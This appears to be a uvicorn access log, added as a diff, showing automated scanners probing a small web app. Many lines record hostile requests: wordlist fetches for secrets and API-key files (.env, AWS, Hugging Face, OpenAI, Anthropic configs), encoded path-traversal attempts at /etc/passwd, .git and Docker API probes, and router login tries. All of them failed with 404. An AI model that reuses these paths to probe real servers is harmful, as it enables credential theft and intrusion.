+INFO:     34.34.175.237:52162 - "GET /back/.env HTTP/1.1" 404 Not Found
+INFO:     34.34.175.237:45860 - "GET /aws-exports.js HTTP/1.1" 404 Not Found
+INFO:     34.34.175.237:52232 - "GET /credentials HTTP/1.1" 404 Not Found
+INFO:     34.34.175.237:45946 - "GET /demo/.env HTTP/1.1" 404 Not Found
+INFO:     34.34.175.237:45882 - "GET /credentials.ini HTTP/1.1" 404 Not Found
+INFO:     34.34.175.237:52292 - "GET /config.env HTTP/1.1" 404 Not Found
+INFO:     34.34.175.237:52106 - "GET /dev/.env HTTP/1.1" 404 Not Found
+INFO:     34.34.175.237:45846 - "GET /config.js HTTP/1.1" 404 Not Found
+INFO:     34.34.175.237:52272 - "GET /media/.env HTTP/1.1" 404 Not Found
+INFO:     34.34.175.237:52094 - "GET /config.php HTTP/1.1" 404 Not Found
+INFO:     34.34.175.237:52262 - "GET /config/config.js HTTP/1.1" 404 Not Found
+INFO:     34.34.175.237:52198 - "GET /new/.env HTTP/1.1" 404 Not Found
+INFO:     34.34.175.237:52174 - "GET /old/.env HTTP/1.1" 404 Not Found
+INFO:     34.34.175.237:52120 - "GET /env HTTP/1.1" 404 Not Found
+INFO:     34.34.175.237:45866 - "GET /env-config.js HTTP/1.1" 404 Not Found
+INFO:     34.34.175.237:45934 - "GET /index.js HTTP/1.1" 404 Not Found
+INFO:     34.34.175.237:45898 - "GET /metrics HTTP/1.1" 404 Not Found
+INFO:     34.34.175.237:45946 - "GET /production/.env HTTP/1.1" 404 Not Found
+INFO:     34.34.175.237:45882 - "GET /sendgrid.env HTTP/1.1" 404 Not Found
+INFO:     34.34.175.237:52158 - "GET /server-info HTTP/1.1" 404 Not Found
+INFO:     34.34.175.237:52198 - "GET /settings.php HTTP/1.1" 404 Not Found
+INFO:     34.34.175.237:52220 - "GET /sentry.properties HTTP/1.1" 404 Not Found
+INFO:     34.34.175.237:52182 - "GET /runtime-config.js HTTP/1.1" 404 Not Found
+INFO:     34.34.175.237:52272 - "GET /staging/.env HTTP/1.1" 404 Not Found
+INFO:     34.34.175.237:52248 - "GET /storage/logs/laravel.log HTTP/1.1" 404 Not Found
+INFO:     34.34.175.237:45944 - "GET /test/.env HTTP/1.1" 404 Not Found
+INFO:     34.34.175.237:52174 - "GET /v1/.env HTTP/1.1" 404 Not Found
+INFO:     34.34.175.237:52106 - "GET /app/config/parameters.yml HTTP/1.1" 404 Not Found
+INFO:     34.34.175.237:52120 - "GET /v2/.env HTTP/1.1" 404 Not Found
+INFO:     34.34.175.237:45866 - "GET /vendor/composer/installed.json HTTP/1.1" 404 Not Found
+INFO:     34.34.175.237:45934 - "GET /wp-content/debug.log HTTP/1.1" 404 Not Found
+INFO:     34.34.175.237:45880 - "GET /config/aws.yml HTTP/1.1" 404 Not Found
+INFO:     34.34.175.237:45846 - "GET /.config/huggingface/token HTTP/1.1" 404 Not Found
+INFO:     34.34.175.237:52232 - "GET /.config/aichat/config.yaml HTTP/1.1" 404 Not Found
+INFO:     34.34.175.237:52292 - "GET /.huggingface/token HTTP/1.1" 404 Not Found
+INFO:     34.34.175.237:52210 - "GET /litellm/config.yaml HTTP/1.1" 404 Not Found
+INFO:     34.34.175.237:52262 - "GET /.cache/huggingface/token HTTP/1.1" 404 Not Found
+INFO:     34.34.175.237:52162 - "GET /.config/llm/keys.json HTTP/1.1" 404 Not Found
+INFO:     34.34.175.237:45860 - "GET /.config/io.datasette.llm/keys.json HTTP/1.1" 404 Not Found
+INFO:     34.34.175.237:52278 - "GET /.config/shell_gpt/.sgptrc HTTP/1.1" 404 Not Found
+INFO:     34.34.175.237:45894 - "GET /litellm.yaml HTTP/1.1" 404 Not Found
+INFO:     34.34.175.237:52094 - "GET /.litellm/config.yaml HTTP/1.1" 404 Not Found
+INFO:     34.34.175.237:52142 - "GET /.config/anthropic/config.json HTTP/1.1" 404 Not Found
+INFO:     34.34.175.237:52198 - "GET /.config/gh/hosts.yml HTTP/1.1" 404 Not Found
+INFO:     34.34.175.237:52126 - "GET /.config/rclone/rclone.conf HTTP/1.1" 404 Not Found
+INFO:     34.34.175.237:45946 - "GET /.idea/workspace.xml HTTP/1.1" 404 Not Found
+INFO:     34.34.175.237:52272 - "GET /.idea/deployment.xml HTTP/1.1" 404 Not Found
+INFO:     34.34.175.237:52158 - "GET /.idea/dataSources.xml HTTP/1.1" 404 Not Found
+INFO:     34.34.175.237:45888 - "GET /.config/openai/config.json HTTP/1.1" 404 Not Found
+INFO:     34.34.175.237:45882 - "GET /.vscode/sftp.json HTTP/1.1" 404 Not Found
+INFO:     34.34.175.237:45904 - "GET /.vscode/settings.json HTTP/1.1" 404 Not Found
+INFO:     34.34.175.237:45944 - "GET /config/production.json HTTP/1.1" 404 Not Found
+INFO:     34.34.175.237:52182 - "GET /config/local.json HTTP/1.1" 404 Not Found
+INFO:     34.34.175.237:52248 - "GET /config/custom-environment-variables.json HTTP/1.1" 404 Not Found
+INFO:     34.34.175.237:45918 - "GET /.openai/credentials.json HTTP/1.1" 404 Not Found
+INFO:     34.34.175.237:45880 - "GET /service_account.json HTTP/1.1" 404 Not Found
+INFO:     34.34.175.237:45894 - "GET /.config/configstore/ HTTP/1.1" 404 Not Found
+INFO:     34.34.175.237:52232 - "GET /.oci/config HTTP/1.1" 404 Not Found
+INFO:     34.34.175.237:45958 - "GET /.config/zed/settings.json HTTP/1.1" 404 Not Found
+INFO:     34.34.175.237:52278 - "GET /service-account-key.json HTTP/1.1" 404 Not Found
+INFO:     34.34.175.237:52292 - "GET /.config/doctl/config.yaml HTTP/1.1" 404 Not Found
+INFO:     34.34.175.237:45846 - "GET /.pg_service.conf HTTP/1.1" 404 Not Found
+INFO:     34.34.175.237:52262 - "GET /OAI_CONFIG_LIST HTTP/1.1" 404 Not Found
+INFO:     34.34.175.237:52162 - "GET /.sentryclirc HTTP/1.1" 404 Not Found
+INFO:     34.34.175.237:45882 - "GET /.config/mods/mods.yml HTTP/1.1" 404 Not Found
+INFO:     34.34.175.237:45944 - "GET /.config/gemini/settings.json HTTP/1.1" 404 Not Found
+INFO:     34.34.175.237:52158 - "GET /.gemini/.env HTTP/1.1" 404 Not Found
+INFO:     34.34.175.237:52272 - "GET /claude_desktop_config.json HTTP/1.1" 404 Not Found
+INFO:     34.34.175.237:45946 - "GET /.config/Claude/claude_desktop_config.json HTTP/1.1" 404 Not Found
+INFO:     34.34.175.237:52126 - "GET /.windsurf/mcp_config.json HTTP/1.1" 404 Not Found
+INFO:     34.34.175.237:52142 - "GET /.config/claude/config.json HTTP/1.1" 404 Not Found
+INFO:     34.34.175.237:52198 - "GET /.aider.model.settings.yml HTTP/1.1" 404 Not Found
+INFO:     34.34.175.237:52210 - "GET /.m2/settings.xml HTTP/1.1" 404 Not Found
+INFO:     34.34.175.237:52094 - "GET /aider.conf.yml HTTP/1.1" 404 Not Found
+INFO:     34.34.175.237:45918 - "GET /settings.xml HTTP/1.1" 404 Not Found
+INFO:     34.34.175.237:52248 - "GET /.gradle/gradle.properties HTTP/1.1" 404 Not Found
+INFO:     34.34.175.237:52232 - "GET /gradle.properties HTTP/1.1" 404 Not Found
+INFO:     34.34.175.237:45894 - "GET /nuget.config HTTP/1.1" 404 Not Found
+INFO:     34.34.175.237:52106 - "GET /prometheus.yml HTTP/1.1" 404 Not Found
+INFO:     34.34.175.237:45888 - "GET /.nuget/NuGet.Config HTTP/1.1" 404 Not Found
+INFO:     34.34.175.237:45958 - "GET /grafana.ini HTTP/1.1" 404 Not Found
+INFO:     34.34.175.237:45880 - "GET /grafana/provisioning/datasources/default.yml HTTP/1.1" 404 Not Found
+INFO:     34.34.175.237:45898 - "GET /.vscode/ftp-sync.json HTTP/1.1" 404 Not Found
+INFO:     34.34.175.237:45934 - "GET /alertmanager.yml HTTP/1.1" 404 Not Found
+INFO:     34.34.175.237:45860 - "GET /.config/configstore/firebase-tools.json HTTP/1.1" 404 Not Found
+INFO:     34.34.175.237:52162 - "GET /rabbitmq.conf HTTP/1.1" 404 Not Found
+INFO:     34.34.175.237:45956 - "GET /oai_config_list.json HTTP/1.1" 404 Not Found
+INFO:     34.34.175.237:45904 - "GET /.config/fabric/.env HTTP/1.1" 404 Not Found
+INFO:     34.34.175.237:45846 - "GET /definitions.json HTTP/1.1" 404 Not Found
+INFO:     34.34.175.237:45946 - "GET /config/secrets.yaml HTTP/1.1" 404 Not Found
+INFO:     34.34.175.237:52158 - "GET /redis.conf HTTP/1.1" 404 Not Found
+INFO:     34.34.175.237:52210 - "GET /passwd-s3fs HTTP/1.1" 404 Not Found
+INFO:     34.34.175.237:52126 - "GET /config/configuration.yaml HTTP/1.1" 404 Not Found
+INFO:     34.34.175.237:52142 - "GET /.mc/config.json HTTP/1.1" 404 Not Found
+INFO:     34.34.175.237:52272 - "GET /.b2_account_info HTTP/1.1" 404 Not Found
+INFO:     34.34.175.237:45944 - "GET /homeassistant/secrets.yaml HTTP/1.1" 404 Not Found
+INFO:     34.34.175.237:45882 - "GET /.vault_pass.txt HTTP/1.1" 404 Not Found
+INFO:     34.34.175.237:45918 - "GET /.buildkite/buildkite-agent.cfg HTTP/1.1" 404 Not Found
+INFO:     34.34.175.237:52094 - "GET /client.ovpn HTTP/1.1" 404 Not Found
+INFO:     34.34.175.237:52278 - "GET /wg0.conf HTTP/1.1" 404 Not Found
+INFO:     34.34.175.237:52174 - "GET /config/default.json HTTP/1.1" 404 Not Found
+INFO:     34.34.175.237:52248 - "GET /secrets.pkrvars.hcl HTTP/1.1" 404 Not Found
+INFO:     34.34.175.237:45934 - "GET /variables.pkrvars.hcl HTTP/1.1" 404 Not Found
+INFO:     34.34.175.237:45888 - "GET /etc/dovecot/dovecot-sql.conf HTTP/1.1" 404 Not Found
+INFO:     34.34.175.237:52198 - "GET /.ansible/vault_pass.txt HTTP/1.1" 404 Not Found
+INFO:     34.34.175.237:52220 - "GET /.env.local.php HTTP/1.1" 404 Not Found
+WARNING:  Invalid HTTP request received.
+INFO:     16.60.94.233:20312 - "GET / HTTP/1.1" 200 OK
+INFO:     16.60.94.233:20312 - "GET /static/img/ciallo.png HTTP/1.1" 200 OK
+INFO:     18.135.209.62:55324 - "GET /robots.txt HTTP/1.1" 404 Not Found
+INFO:     18.139.37.197:6390 - "GET /.well-known/security.txt HTTP/1.1" 404 Not Found
+INFO:     52.14.197.136:62716 - "GET /security.txt HTTP/1.1" 404 Not Found
+WARNING:  Invalid HTTP request received.
+WARNING:  Unsupported upgrade request.
+WARNING:  No supported WebSocket library detected. Please use "pip install 'uvicorn[standard]'", or install 'websockets' or 'wsproto' manually.
+INFO:     39.103.139.251:45550 - "GET / HTTP/1.1" 200 OK
+WARNING:  Invalid HTTP request received.
+INFO:     43.165.7.132:45308 - "GET / HTTP/1.1" 200 OK
+WARNING:  Invalid HTTP request received.
+INFO:     195.184.76.189:54669 - "GET / HTTP/1.1" 200 OK
+INFO:     195.184.76.92:56189 - "GET /static/img/ciallo.png HTTP/1.1" 200 OK
+INFO:     188.166.68.160:40136 - "GET / HTTP/1.1" 200 OK
+INFO:     188.166.68.160:40136 - "GET /static/img/ciallo.png HTTP/1.1" 200 OK
+INFO:     45.135.193.193:56198 - "CONNECT httpbin.org%3A443 HTTP/1.1" 404 Not Found
+INFO:     153.117.39.87:14589 - "POST /HNAP1/ HTTP/1.0" 404 Not Found
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+INFO:     77.67.26.133:47292 - "GET / HTTP/1.1" 200 OK
+INFO:     45.156.87.63:58758 - "GET / HTTP/1.1" 200 OK
+WARNING:  Invalid HTTP request received.
+INFO:     205.172.161.237:37948 - "GET /../../../../../../../../../../../../etc/passwd HTTP/1.1" 404 Not Found
+INFO:     205.172.161.237:37962 - "GET /files/../../../../../../../../../../../../etc/passwd HTTP/1.1" 404 Not Found
+INFO:     205.172.161.237:37964 - "GET /cgi-bin/../../../../etc/passwd HTTP/1.1" 404 Not Found
+INFO:     205.172.161.237:37968 - "GET /files/../../../../../../../../../../../../../../../../etc/passwd HTTP/1.1" 404 Not Found
+INFO:     89.248.164.165:60772 - "GET http%3A//ossweb-img.qq.com/images/js/eas/eas.js HTTP/1.1" 404 Not Found
+WARNING:  Invalid HTTP request received.
+INFO:     205.172.161.237:50770 - "GET /../../../../../../../../../../../../etc/passwd HTTP/1.1" 404 Not Found
+INFO:     205.172.161.237:50780 - "GET /files/../../../../../../../../../../../../etc/passwd HTTP/1.1" 404 Not Found
+INFO:     205.172.161.237:50484 - "GET /cgi-bin/../../../../etc/passwd HTTP/1.1" 404 Not Found
+INFO:     205.172.161.237:50492 - "GET /files/../../../../../../../../../../../../../../../../etc/passwd HTTP/1.1" 404 Not Found
+INFO:     176.65.148.51:16167 - "GET / HTTP/1.1" 200 OK
+INFO:     45.144.212.158:58686 - "GET /.git/index HTTP/1.1" 404 Not Found
+INFO:     198.235.24.196:61032 - "GET / HTTP/1.1" 200 OK
+INFO:     152.32.233.221:50902 - "GET / HTTP/1.1" 200 OK
+INFO:     152.32.233.221:41094 - "GET /static/img/ciallo.png HTTP/1.1" 200 OK
+WARNING:  Invalid HTTP request received.
+INFO:     23.132.164.201:55192 - "GET /.env HTTP/1.1" 404 Not Found
+INFO:     43.165.127.225:33152 - "GET / HTTP/1.1" 200 OK
+INFO:     205.172.161.237:42954 - "GET /../../../../../../../../../../../../etc/passwd HTTP/1.1" 404 Not Found
+INFO:     205.172.161.237:42958 - "GET /../../../../../../etc/passwd HTTP/1.1" 404 Not Found
+INFO:     205.172.161.237:42972 - "GET /files/../../../../../../../../../../../../etc/passwd HTTP/1.1" 404 Not Found
+INFO:     205.172.161.237:42978 - "GET /cgi-bin/../../../../etc/passwd HTTP/1.1" 404 Not Found
+INFO:     205.172.161.237:60304 - "GET /../../../../../../etc/passwd HTTP/1.1" 404 Not Found
+INFO:     205.172.161.237:60314 - "GET /../../../../../../../../../../../../etc/passwd HTTP/1.1" 404 Not Found
+INFO:     205.172.161.237:60322 - "GET /assets/../../../../../../etc/passwd HTTP/1.1" 404 Not Found
+INFO:     205.172.161.237:60328 - "GET /static/../../../../../../etc/passwd HTTP/1.1" 404 Not Found
+INFO:     205.172.161.237:60342 - "GET /index.html/../../../../../../etc/passwd HTTP/1.1" 404 Not Found
+INFO:     205.172.161.237:60356 - "GET /../../../../../../../../../../../../etc/passwd HTTP/1.1" 404 Not Found
+INFO:     205.172.161.237:60360 - "GET /../../../../../../etc/passwd HTTP/1.1" 404 Not Found
+INFO:     205.172.161.237:60366 - "GET /../../../../../../etc/passwd HTTP/1.1" 404 Not Found
+INFO:     205.172.161.237:60368 - "GET /..%3B/..%3B/..%3B/..%3B/..%3B/..%3B/etc/passwd HTTP/1.1" 404 Not Found
+INFO:     205.172.161.237:60382 - "GET /....//....//....//....//....//....//etc/passwd HTTP/1.1" 404 Not Found
+INFO:     205.172.161.237:60394 - "GET /files/../../../../../../../../../../../../../../../../etc/passwd HTTP/1.1" 404 Not Found
+INFO:     205.172.161.237:60400 - "GET /..%EF%BF%BD%EF%BF%BD..%EF%BF%BD%EF%BF%BD..%EF%BF%BD%EF%BF%BD..%EF%BF%BD%EF%BF%BD..%EF%BF%BD%EF%BF%BD..%EF%BF%BD%EF%BF%BDetc/passwd HTTP/1.1" 404 Not Found
+INFO:     205.172.161.237:60402 - "GET /..%5C..%5C..%5C..%5C..%5C..%5Cetc/passwd HTTP/1.1" 404 Not Found
+INFO:     205.172.161.237:60416 - "GET /..%252f..%252f..%252f..%252f..%252f..%252fetc/passwd HTTP/1.1" 404 Not Found
+INFO:     205.172.161.237:38782 - "GET /..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fetc/passwd HTTP/1.1" 404 Not Found
+INFO:     198.235.24.235:52905 - "GET / HTTP/1.0" 200 OK
+INFO:     104.155.66.115:20726 - "GET / HTTP/1.1" 200 OK
+INFO:     197.158.54.62:46810 - "GET /boaform/adminformLogout//boaform/admin/login.asp HTTP/1.0" 404 Not Found
+WARNING:  Invalid HTTP request received.
+WARNING:  Unsupported upgrade request.
+WARNING:  No supported WebSocket library detected. Please use "pip install 'uvicorn[standard]'", or install 'websockets' or 'wsproto' manually.
+INFO:     139.196.50.228:53226 - "GET / HTTP/1.1" 200 OK
+INFO:     205.172.161.237:59032 - "GET /../../../../../../../../../../../../etc/passwd HTTP/1.1" 404 Not Found
+INFO:     205.172.161.237:59046 - "GET /../../../../../../etc/passwd HTTP/1.1" 404 Not Found
+INFO:     207.175.103.117:19980 - "GET / HTTP/1.1" 200 OK
+INFO:     205.172.161.237:45608 - "GET /../../../../../../../../../../../../etc/passwd HTTP/1.1" 404 Not Found
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+INFO:     109.105.210.99:14376 - "GET / HTTP/1.1" 200 OK
+INFO:     151.245.151.144:50536 - "GET / HTTP/1.1" 200 OK
+INFO:     151.245.151.144:50536 - "GET /static/img/ciallo.png HTTP/1.1" 200 OK
+INFO:     39.100.78.231:45334 - "GET / HTTP/1.0" 200 OK
+INFO:     39.100.78.231:45826 - "POST /sdk HTTP/1.1" 404 Not Found
+INFO:     39.100.78.231:45814 - "GET /nmaplowercheck1795215314 HTTP/1.1" 404 Not Found
+INFO:     39.100.78.231:45824 - "GET / HTTP/1.0" 200 OK
+INFO:     39.100.78.231:45838 - "GET /evox/about HTTP/1.1" 404 Not Found
+INFO:     39.100.78.231:45846 - "GET /HNAP1 HTTP/1.1" 404 Not Found
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+INFO:     39.100.78.231:46276 - "GET / HTTP/1.0" 200 OK
+INFO:     39.100.78.231:46280 - "GET / HTTP/1.1" 200 OK
+INFO:     43.130.57.46:46360 - "GET / HTTP/1.1" 200 OK
+INFO:     34.106.43.166:55186 - "GET /.git/config HTTP/1.1" 404 Not Found
+INFO:     47.116.100.219:41678 - "GET / HTTP/1.1" 200 OK
+WARNING:  Invalid HTTP request received.
+INFO:     162.128.129.119:46444 - "GET / HTTP/1.1" 200 OK
+WARNING:  Invalid HTTP request received.
+INFO:     91.196.152.156:54697 - "GET / HTTP/1.1" 200 OK
+INFO:     91.231.89.234:52513 - "GET /static/img/ciallo.png HTTP/1.1" 200 OK
+INFO:     54.167.72.12:15012 - "GET / HTTP/1.1" 200 OK
+INFO:     198.235.24.221:57974 - "GET /metrics HTTP/1.1" 404 Not Found
+INFO:     105.184.177.178:52146 - "GET /boaform/adminformLogout//boaform/admin/login.asp HTTP/1.0" 404 Not Found
+WARNING:  Invalid HTTP request received.
+INFO:     66.132.195.119:50024 - "GET / HTTP/1.1" 200 OK
+INFO:     66.132.195.119:50034 - "PRI %2A HTTP/2.0" 404 Not Found
+WARNING:  Invalid HTTP request received.
+INFO:     66.132.195.119:43824 - "GET /static/img/ciallo.png HTTP/1.1" 200 OK
+INFO:     66.132.195.119:50270 - "GET /favicon.ico HTTP/1.1" 404 Not Found
+INFO:     66.132.195.119:45172 - "GET /static/js/home.js HTTP/1.1" 200 OK
+INFO:     66.132.195.119:27452 - "GET /static/img/ciallo.png HTTP/1.1" 200 OK
+INFO:     66.132.195.119:14408 - "GET /static/img/%E6%90%9C%E7%B4%A2.png HTTP/1.1" 200 OK
+WARNING:  Invalid HTTP request received.
+INFO:     66.132.195.119:23204 - "GET /sitemap.xml HTTP/1.1" 404 Not Found
+WARNING:  Invalid HTTP request received.
+INFO:     106.37.198.14:19492 - "GET / HTTP/1.1" 200 OK
+INFO:     106.37.198.14:19492 - "POST /onvif/device_service HTTP/1.1" 404 Not Found
+INFO:     106.37.198.14:19492 - "POST /onvif/Device HTTP/1.1" 404 Not Found
+INFO:     106.37.198.14:19494 - "GET /upnp_device_desc.xml HTTP/1.1" 404 Not Found
+INFO:     106.37.198.14:19494 - "GET /upnp/desc.xml HTTP/1.1" 404 Not Found
+INFO:     106.37.198.14:19494 - "GET /description.xml HTTP/1.1" 404 Not Found
+INFO:     106.37.198.14:19494 - "GET /device_desc.xml HTTP/1.1" 404 Not Found
+INFO:     106.37.198.14:19494 - "GET /upnp/device.xml HTTP/1.1" 404 Not Found
+INFO:     106.37.198.14:19494 - "GET /rootDesc.xml HTTP/1.1" 404 Not Found
+INFO:     106.37.198.14:19494 - "GET /DeviceDescription.xml HTTP/1.1" 404 Not Found
+INFO:     106.37.198.14:19494 - "POST /onvif/device_service HTTP/1.1" 404 Not Found
+INFO:     106.37.198.14:19494 - "POST /onvif/device_service HTTP/1.1" 404 Not Found
+INFO:     106.37.198.14:19494 - "POST /onvif/Device HTTP/1.1" 404 Not Found
+INFO:     106.37.198.14:19494 - "POST /onvif/Device HTTP/1.1" 404 Not Found
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+INFO:     39.100.77.72:46266 - "GET / HTTP/1.1" 200 OK
+INFO:     39.100.77.72:46342 - "GET /static/img/ciallo.png HTTP/1.1" 200 OK
+WARNING:  Invalid HTTP request received.
+INFO:     137.184.85.24:56908 - "GET /aaa9 HTTP/1.1" 404 Not Found
+INFO:     137.184.85.24:56910 - "GET /aab8 HTTP/1.1" 404 Not Found
+INFO:     178.128.228.237:41044 - "GET / HTTP/1.1" 200 OK
+WARNING:  Invalid HTTP request received.
+INFO:     89.37.117.80:48578 - "GET /../../../../../../../../../../../../etc/passwd HTTP/1.1" 404 Not Found
+INFO:     89.37.117.80:33556 - "GET /../../../../../../etc/passwd HTTP/1.1" 404 Not Found
+INFO:     89.37.117.80:33570 - "GET /cgi-bin/../../../../etc/passwd HTTP/1.1" 404 Not Found
+INFO:     89.37.117.80:33578 - "GET /../../../../../../etc/passwd HTTP/1.1" 404 Not Found
+INFO:     89.37.117.80:33586 - "GET /../../../../../../../../../../../../etc/passwd HTTP/1.1" 404 Not Found
+INFO:     89.37.117.80:33600 - "GET /assets/../../../../../../etc/passwd HTTP/1.1" 404 Not Found
+INFO:     188.166.100.41:35302 - "GET / HTTP/1.1" 200 OK
+INFO:     188.166.100.41:35302 - "GET /static/img/ciallo.png HTTP/1.1" 200 OK
+INFO:     45.135.193.193:60442 - "CONNECT httpbin.org%3A443 HTTP/1.1" 404 Not Found
+INFO:     3.70.222.170:48970 - "GET / HTTP/1.1" 200 OK
+INFO:     43.157.20.63:35260 - "GET / HTTP/1.1" 200 OK
+INFO:     172.234.217.192:59294 - "GET / HTTP/1.1" 200 OK
+INFO:     102.220.163.241:12610 - "GET /_profiler/phpinfo HTTP/1.1" 404 Not Found
+INFO:     185.226.197.75:44204 - "GET / HTTP/1.1" 200 OK
+WARNING:  Invalid HTTP request received.
+INFO:     66.228.53.174:8100 - "GET / HTTP/1.1" 200 OK
+INFO:     109.105.210.103:41328 - "GET / HTTP/1.1" 200 OK
+INFO:     109.105.210.102:53788 - "GET /static/img/ciallo.png HTTP/1.1" 200 OK
+INFO:     109.105.210.102:53774 - "GET /favicon.ico HTTP/1.1" 404 Not Found
+INFO:     43.138.5.244:43682 - "GET / HTTP/1.1" 200 OK
+INFO:     43.138.5.244:44162 - "GET /.env HTTP/1.1" 404 Not Found
+INFO:     43.138.5.244:51320 - "GET /containers/json HTTP/1.1" 404 Not Found
+INFO:     43.138.5.244:51596 - "GET /version HTTP/1.1" 404 Not Found
+INFO:     43.138.5.244:52516 - "GET /.git/config HTTP/1.1" 404 Not Found
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+INFO:     43.138.5.244:42850 - "GET /containers/json HTTP/1.1" 404 Not Found
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+INFO:     43.138.5.244:48494 - "GET /.env HTTP/1.1" 404 Not Found
+WARNING:  Invalid HTTP request received.
+INFO:     43.138.5.244:50070 - "GET /service-account.json HTTP/1.1" 404 Not Found
+WARNING:  Invalid HTTP request received.
+INFO:     43.138.5.244:51066 - "GET /.aws/credentials HTTP/1.1" 404 Not Found
+WARNING:  Invalid HTTP request received.
+INFO:     58.11.36.38:11479 - "GET /boaform/adminformLogout//boaform/admin/login.asp HTTP/1.0" 404 Not Found
+INFO:     85.11.167.204:48296 - "GET /_profiler/phpinfo HTTP/1.1" 404 Not Found
+INFO:     117.194.99.207:50210 - "GET /boaform/adminformLogout//boaform/admin/login.asp HTTP/1.0" 404 Not Found
+INFO:     43.156.36.169:51042 - "GET / HTTP/1.1" 200 OK
+INFO:     94.102.49.190:58634 - "GET / HTTP/1.1" 200 OK
+INFO:     94.102.49.190:58646 - "GET /robots.txt HTTP/1.1" 404 Not Found
+INFO:     94.102.49.190:58658 - "GET /sitemap.xml HTTP/1.1" 404 Not Found
+INFO:     94.102.49.190:58660 - "GET /.well-known/security.txt HTTP/1.1" 404 Not Found
+INFO:     94.102.49.190:58676 - "GET /static/img/ciallo.png HTTP/1.1" 200 OK
+INFO:     216.180.246.24:21515 - "GET / HTTP/1.0" 200 OK
+INFO:     216.180.246.24:21515 - "GET / HTTP/1.0" 200 OK
+WARNING:  Invalid HTTP request received.
+INFO:     216.180.246.24:23832 - "GET / HTTP/1.1" 200 OK
+INFO:     49.47.216.173:46044 - "GET / HTTP/1.1" 200 OK
+INFO:     45.144.212.158:39746 - "GET /.git/HEAD HTTP/1.1" 404 Not Found
+INFO:     45.138.12.42:24616 - "GET /api/session/properties HTTP/1.1" 404 Not Found
+INFO:     112.252.165.239:48649 - "GET /boaform/admin/formLogin?username=ec8&psd=ec8 HTTP/1.0" 404 Not Found
+INFO:     207.175.103.117:35924 - "GET / HTTP/1.1" 200 OK
+INFO:     35.210.230.229:19464 - "GET / HTTP/1.1" 200 OK
+WARNING:  Invalid HTTP request received.
+INFO:     35.206.155.5:41510 - "GET / HTTP/1.1" 200 OK
+INFO:     35.206.155.5:41526 - "GET /pub/ HTTP/1.1" 404 Not Found
+INFO:     35.206.155.5:41528 - "GET /files/ HTTP/1.1" 404 Not Found
+INFO:     35.206.155.5:41544 - "GET /downloads/ HTTP/1.1" 404 Not Found
+INFO:     20.14.76.13:42532 - "GET /developmentserver/metadatauploader HTTP/1.1" 404 Not Found
+INFO:     129.226.146.146:33744 - "GET / HTTP/1.1" 200 OK
+INFO:     20.2.211.78:39900 - "GET / HTTP/1.1" 200 OK
+INFO:     20.2.211.78:39900 - "GET /static/js/home.js HTTP/1.1" 200 OK
+INFO:     20.2.211.78:39900 - "GET /static/subpages/loginPage.html HTTP/1.1" 200 OK
+INFO:     74.249.178.185:53346 - "GET /manager/text/list HTTP/1.1" 404 Not Found
+INFO:     45.63.4.69:44002 - "GET / HTTP/1.1" 200 OK
+INFO:     184.105.247.194:12548 - "GET / HTTP/1.1" 200 OK
+INFO:     184.105.247.194:48990 - "GET /favicon.ico HTTP/1.1" 404 Not Found
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+INFO:     184.105.247.194:10294 - "GET /static/img/ciallo.png HTTP/1.1" 200 OK
+INFO:     184.105.247.194:26404 - "GET /geoserver/web/ HTTP/1.1" 404 Not Found
+WARNING:  Invalid HTTP request received.
+INFO:     43.134.91.35:44408 - "GET / HTTP/1.1" 200 OK
+INFO:     4.150.194.120:40750 - "GET / HTTP/1.1" 200 OK
+INFO:     113.215.188.182:56321 - "GET / HTTP/1.1" 200 OK
+INFO:     113.215.188.182:56321 - "GET / HTTP/1.1" 200 OK
+INFO:     113.215.188.182:56321 - "GET /static/img/ciallo.png HTTP/1.1" 200 OK
+INFO:     113.215.188.182:56321 - "GET /static/img/ciallo.png HTTP/1.1" 200 OK
+INFO:     113.215.188.182:5905 - "GET /static/img/%E6%90%9C%E7%B4%A2.png HTTP/1.1" 200 OK
+INFO:     113.215.188.182:5905 - "GET / HTTP/1.1" 200 OK
+INFO:     113.215.188.182:56321 - "GET / HTTP/1.1" 200 OK
+INFO:     113.215.188.182:5905 - "GET /static/img/ciallo.png HTTP/1.1" 200 OK
+INFO:     113.215.188.182:56321 - "GET /static/img/ciallo.png HTTP/1.1" 200 OK
+INFO:     113.215.188.182:5905 - "GET /static/img/%E7%94%A8%E6%88%B7.png HTTP/1.1" 200 OK
+INFO:     113.215.188.182:56321 - "GET /subpages/settingPage HTTP/1.1" 404 Not Found
+INFO:     113.215.188.182:5905 - "GET / HTTP/1.1" 200 OK
+INFO:     113.215.188.182:5905 - "GET /static/img/ciallo.png HTTP/1.1" 200 OK
+INFO:     59.82.83.42:7201 - "GET / HTTP/1.1" 200 OK
+INFO:     59.82.83.42:7201 - "GET / HTTP/1.1" 200 OK
+INFO:     59.82.83.42:7201 - "GET /static/img/ciallo.png HTTP/1.1" 200 OK
+INFO:     59.82.83.42:7201 - "GET /static/img/ciallo.png HTTP/1.1" 200 OK
+INFO:     59.82.83.129:40778 - "GET /static/img/%E6%90%9C%E7%B4%A2.png HTTP/1.1" 200 OK
+INFO:     59.82.83.42:7201 - "GET / HTTP/1.1" 200 OK
+INFO:     59.82.83.129:40778 - "GET / HTTP/1.1" 200 OK
+INFO:     59.82.83.42:7201 - "GET /static/img/ciallo.png HTTP/1.1" 200 OK
+INFO:     59.82.83.129:40778 - "GET /static/img/ciallo.png HTTP/1.1" 200 OK
+INFO:     59.82.83.42:7201 - "GET /static/img/%E7%94%A8%E6%88%B7.png HTTP/1.1" 200 OK
+INFO:     59.82.83.42:7201 - "GET / HTTP/1.1" 200 OK
+INFO:     59.82.83.42:7201 - "GET /static/img/ciallo.png HTTP/1.1" 200 OK
+INFO:     59.82.83.129:40778 - "GET /subpages/settingPage HTTP/1.1" 404 Not Found
+INFO:     89.248.172.11:32014 - "GET / HTTP/1.0" 200 OK
